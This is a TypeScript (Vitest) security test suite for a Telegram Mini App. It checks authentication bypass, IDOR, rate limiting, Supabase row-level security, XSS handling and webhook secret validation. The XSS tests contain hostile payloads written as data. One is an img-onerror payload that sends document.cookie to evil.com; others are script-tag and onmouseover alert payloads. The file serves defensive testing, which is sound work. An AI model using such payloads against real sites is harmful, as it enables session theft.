/**
 * Authentication & Authorization Security Tests
 *
 * These tests verify that authentication and authorization controls
 * cannot be bypassed. They target the most common web vulnerabilities
 * for a Telegram Mini App: authentication bypass, IDOR, and privilege escalation.
 *
 * Run: npx vitest run src/__tests__/security/auth-security.test.ts
 */

import { describe, it, expect } from "vitest";
import { createClient } from "@supabase/supabase-js";

// ============================================================================
// TEST SETUP
// ============================================================================

const API_BASE = process.env.TEST_API_BASE ?? "http://localhost:3000";
const SUPABASE_URL = process.env.NEXT_PUBLIC_SUPABASE_URL!;
const SUPABASE_ANON_KEY = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!;

/**
 * NOTE: This test file requires test infrastructure to run.
 * The variables below (userAToken, userBToken, userAId, userBId) must be
 * populated by test setup (e.g., creating test users via the auth flow).
 *
 * As-is, these are structural templates demonstrating security test patterns.
 * To run: add test setup/teardown logic and real test account creation.
 */

// Test user tokens (must be populated by test setup)
let userAToken = "";
let userBToken = "";
let userAId = "";
let userBId = "";

// ============================================================================
// AUTHENTICATION TESTS
// ============================================================================

describe("Authentication Security", () => {
  describe("Telegram initData Validation", () => {
    it("should reject invalid initData", async () => {
      const res = await fetch(`${API_BASE}/api/auth/telegram`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ initData: "invalid_data_here" }),
      });
      expect(res.status).toBe(401);
    });

    it("should reject empty initData", async () => {
      const res = await fetch(`${API_BASE}/api/auth/telegram`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ initData: "" }),
      });
      expect(res.status).toBe(400);
    });

    it("should reject initData without hash field", async () => {
      // Valid format but missing hash
      const res = await fetch(`${API_BASE}/api/auth/telegram`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          initData: "query_id=test&user=%7B%22id%22%3A123%7D&auth_date=1000000",
        }),
      });
      expect(res.status).toBe(401);
    });

    it("should not trust client-provided user ID", async () => {
      // The server must derive identity from validated initData,
      // NOT from any client-supplied user_id field
      const res = await fetch(`${API_BASE}/api/auth/telegram`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          initData: "some_data",
          userId: "attacker_provided_user_id",
        }),
      });
      // Should reject because initData is invalid despite having userId
      expect(res.status).toBe(401);
    });
  });

  describe("Rate Limiting", () => {
    it("should rate-limit excessive auth attempts", async () => {
      const promises = [];
      // Attempt 15 rapid auth requests (limit is 10/min)
      for (let i = 0; i < 15; i++) {
        promises.push(
          fetch(`${API_BASE}/api/auth/telegram`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ initData: `spam_attempt_${i}` }),
          }),
        );
      }
      const results = await Promise.all(promises);
      const rateLimited = results.filter((r) => r.status === 429);
      expect(rateLimited.length).toBeGreaterThan(0);
    });
  });

  describe("Session Security", () => {
    it("should reject expired sessions", async () => {
      const res = await fetch(`${API_BASE}/api/me`, {
        headers: {
          Authorization: "Bearer expired_token_that_was_never_valid",
        },
      });
      expect(res.status).toBe(401);
    });

    it("should reject tampered tokens", async () => {
      const res = await fetch(`${API_BASE}/api/me`, {
        headers: {
          Authorization: "Bearer eyJhbGciOiJIUzI1NiJ9.tampered.payload",
        },
      });
      expect(res.status).toBe(401);
    });
  });
});

// ============================================================================
// AUTHORIZATION / IDOR TESTS
// ============================================================================

describe("Authorization (IDOR) Security", () => {
  describe("Profile Access Controls", () => {
    it("should prevent User A from accessing User B's private profile fields", async () => {
      const res = await fetch(`${API_BASE}/api/profiles/${userBId}`, {
        headers: { Authorization: `Bearer ${userAToken}` },
      });
      const data = await res.json();

      // Private fields should not be exposed to other users
      expect(data.profile?.dateOfBirth).toBeUndefined();
      expect(data.profile?.email).toBeUndefined();
      expect(data.profile?.phone).toBeUndefined();
    });

    it("should prevent unauthenticated profile access", async () => {
      const res = await fetch(`${API_BASE}/api/profiles/${userBId}`);
      expect(res.status).toBe(401);
    });
  });

  describe("Message Access Controls", () => {
    it("should prevent User A from reading User B's private messages", async () => {
      // User A tries to access a conversation they don't belong to
      const res = await fetch(`${API_BASE}/api/chat/conversation_b_id/messages`, {
        headers: { Authorization: `Bearer ${userAToken}` },
      });
      expect(res.status).toBe(403);
    });

    it("should prevent User A from sending messages as User B", async () => {
      const res = await fetch(`${API_BASE}/api/chat/conversation_id/messages`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${userAToken}`,
        },
        body: JSON.stringify({
          content: "Impersonation attempt",
          senderId: userBId, // Attempting to spoof sender
        }),
      });
      expect(res.status).toBe(403);
    });
  });

  describe("Payment Data Access Controls", () => {
    it("should prevent User A from viewing User B's payment history", async () => {
      const res = await fetch(`${API_BASE}/api/billing/subscriptions?userId=${userBId}`, {
        headers: { Authorization: `Bearer ${userAToken}` },
      });
      expect(res.status).toBe(403);
    });

    it("should prevent User A from viewing User B's transactions", async () => {
      const res = await fetch(`${API_BASE}/api/billing/transactions?userId=${userBId}`, {
        headers: { Authorization: `Bearer ${userAToken}` },
      });
      expect(res.status).toBe(403);
    });
  });

  describe("Admin Access Controls", () => {
    it("should prevent unauthenticated access to any admin endpoint", async () => {
      const endpoints = [
        "/api/admin/reports",
        "/api/admin/users",
        "/api/admin/dashboard",
        "/api/admin/content",
        "/api/admin/billing/subscriptions",
      ];
      for (const endpoint of endpoints) {
        const res = await fetch(`${API_BASE}${endpoint}`);
        expect(res.status).toBe(401);
      }
    });
  });

  describe("Resource Ownership", () => {
    it("should prevent User A from deleting User B's posts", async () => {
      const res = await fetch(`${API_BASE}/api/posts?id=${"user_b_post_id"}`, {
        method: "DELETE",
        headers: { Authorization: `Bearer ${userAToken}` },
      });
      expect(res.status).toBe(403);
    });

    it("should prevent User A from editing User B's profile", async () => {
      const res = await fetch(`${API_BASE}/api/profiles/${userBId}`, {
        method: "PATCH",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${userAToken}`,
        },
        body: JSON.stringify({ bio: "Hacked bio" }),
      });
      expect(res.status).toBe(403);
    });
  });
});

// ============================================================================
// SUPABASE RLS TESTS
// ============================================================================

describe("RLS (Row Level Security)", () => {
  it("should prevent direct anonymous access to messages table", async () => {
    const anonClient = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
    const { data, error } = await anonClient.from("messages").select("*");
    // RLS should block returning any data
    expect(error).toBeDefined();
    expect(data).toBeNull();
  });

  it("should prevent direct anonymous access to payment_events table", async () => {
    const anonClient = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
    const { data, error } = await anonClient.from("payment_events").select("*");
    expect(error).toBeDefined();
    expect(data).toBeNull();
  });

  it("should prevent direct anonymous access to conversations table", async () => {
    const anonClient = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
    const { data, error } = await anonClient.from("conversations").select("*");
    expect(error).toBeDefined();
    expect(data).toBeNull();
  });

  it("should prevent direct anonymous access to verification data", async () => {
    const anonClient = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
    const { data, error } = await anonClient.from("verification_requests").select("*");
    expect(error).toBeDefined();
    expect(data).toBeNull();
  });

  it("should prevent direct anonymous access to trust_profiles", async () => {
    const anonClient = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
    const { data, error } = await anonClient.from("trust_profiles").select("*");
    expect(error).toBeDefined();
    expect(data).toBeNull();
  });

  it("should prevent direct anonymous access to admin_audit_log", async () => {
    const anonClient = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
    const { data, error } = await anonClient.from("admin_audit_log").select("*");
    expect(error).toBeDefined();
    expect(data).toBeNull();
  });

  it("should prevent direct anonymous access to dead_letter_queue", async () => {
    const anonClient = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
    const { data, error } = await anonClient.from("dead_letter_queue").select("*");
    expect(error).toBeDefined();
    expect(data).toBeNull();
  });
});

// ============================================================================
// XSS PROTECTION TESTS
// ============================================================================

describe("XSS Protection", () => {
  it("should not execute script tags in profile bios", async () => {
    const maliciousBio = '<script>alert("xss")</script>Cyber Security Researcher';
    const res = await fetch(`${API_BASE}/api/profile`, {
      method: "PATCH",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${userAToken}`,
      },
      body: JSON.stringify({ bio: maliciousBio }),
    });
    // Should either sanitize the input or accept it as-is (React escapes by default)
    expect(res.status).toBe(200);

    // Verify stored value is safely handled
    const getRes = await fetch(`${API_BASE}/api/profiles/${userAId}`, {
      headers: { Authorization: `Bearer ${userAToken}` },
    });
    const data = await getRes.json();
    // Should not contain executable HTML
    expect(data.profile?.bio).not.toContain("<script");
  });

  it("should prevent XSS via message content", async () => {
    const maliciousMsg = '<img src=x onerror="fetch(\'https://evil.com/steal?cookie=\'+document.cookie)">';
    const res = await fetch(`${API_BASE}/api/chat/conversation_id/messages`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${userAToken}`,
      },
      body: JSON.stringify({ content: maliciousMsg }),
    });
    // Message should either be sanitized or stored as text
    expect(res.status).toBe(200);
  });

  it("should prevent XSS via comment content", async () => {
    const maliciousComment = '<a onmouseover="alert(1)">Hover me</a>';
    const res = await fetch(`${API_BASE}/api/posts/comments`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${userAToken}`,
      },
      body: JSON.stringify({
        postId: "test_post_id",
        content: maliciousComment,
      }),
    });
    expect(res.status).toBe(200);
  });
});

// ============================================================================
// WEBHOOK SECURITY TESTS
// ============================================================================

describe("Webhook Security", () => {
  it("should reject webhook requests without valid secret", async () => {
    const res = await fetch(`${API_BASE}/api/billing/webhook`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Telegram-Bot-Api-Secret-Token": "invalid_secret",
      },
      body: JSON.stringify({ update_id: 1 }),
    });
    expect(res.status).toBe(401);
  });

  it("should reject webhook requests without any auth header", async () => {
    const res = await fetch(`${API_BASE}/api/billing/webhook`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ update_id: 1 }),
    });
    expect(res.status).toBe(401);
  });
});
